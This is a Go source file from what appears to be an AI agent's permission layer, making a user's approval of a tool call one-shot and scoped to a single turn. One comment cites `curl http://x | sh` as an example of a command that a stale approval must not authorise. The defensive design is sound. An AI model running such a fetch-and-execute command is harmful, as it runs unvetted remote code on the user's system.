package turn

import (
	"context"
	"sync/atomic"
)

// Approving ONCE has to mean something.
//
// "Approve" resolves the prompt and resumes the turn, and until this
// existed it recorded nothing anywhere — so the resumed turn re-ran the
// same tool call, met the same require_confirmation, and sent another
// keyboard. Tapping Approve produced a new prompt, forever, and the
// only escape was a scope the user had not asked for.
//
// The budget path never hit it because Budget.Relax() carries "this
// turn is authorised" across the resume. Policy had no equivalent.
//
// Turn-scoped rather than conversation-scoped, because the user
// answered a question about one operation in one turn. It rides the
// context, so it expires when the resumed turn's context does.
type turnApprovalKey struct{}

type turnApproval struct {
	action   string
	resource string
	// used makes the approval ONE-SHOT.
	//
	// Without it an approval covers the operation for the whole
	// remaining turn, which is wrong wherever one resource stands for
	// more than one command: every unclassifiable command shares the
	// resource "!unclassified", so approving `cd /tmp && ls` once would
	// have silently authorised `curl http://x | sh` later in the same
	// turn. The user answered about one call; this answers for one call.
	used atomic.Bool
}

// WithTurnApproval marks one operation as answered for the remainder
// of this turn.
//
// The pair comes from the PROMPT RECORD, written when the turn paused,
// never from the callback that resolved it. A callback is
// attacker-shaped input — the same reason the grant helpers take the
// operation from the pending scope rather than reading it off the tap.
//
// An empty action grants nothing: a budget confirmation carries no
// operation, and "approved everything" is not the reading of a blank.
func WithTurnApproval(ctx context.Context, action, resource string) context.Context {
	if action == "" {
		return ctx
	}
	return context.WithValue(ctx, turnApprovalKey{}, &turnApproval{action: action, resource: resource})
}

// ApprovalPending reports whether ctx carries an approval that has
// not been spent yet.
//
// Read-only: the resume path uses it to decide whether this is a
// confirmation about a TOOL CALL at all. A budget confirmation carries
// no operation, so it never sets one.
func ApprovalPending(ctx context.Context) bool {
	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
	return ok && a.action != "" && !a.used.Load()
}

// TakeApproval transfers an unspent approval to an authenticated remote runner.
// Consuming here prevents a second RPC from reusing the same context grant.
func TakeApproval(ctx context.Context) (action, resource string) {
	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
	if !ok || a.action == "" || !a.used.CompareAndSwap(false, true) {
		return "", ""
	}
	return a.action, a.resource
}

// Approved reports whether this turn already answered for exactly
// this operation. The match is one-shot: a second call sharing this
// resource is asked about rather than waved through.
func Approved(ctx context.Context, action, resource string) bool {
	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
	if !ok || a.action == "" {
		return false
	}
	if a.action != action || a.resource != resource {
		return false
	}
	return a.used.CompareAndSwap(false, true)
}
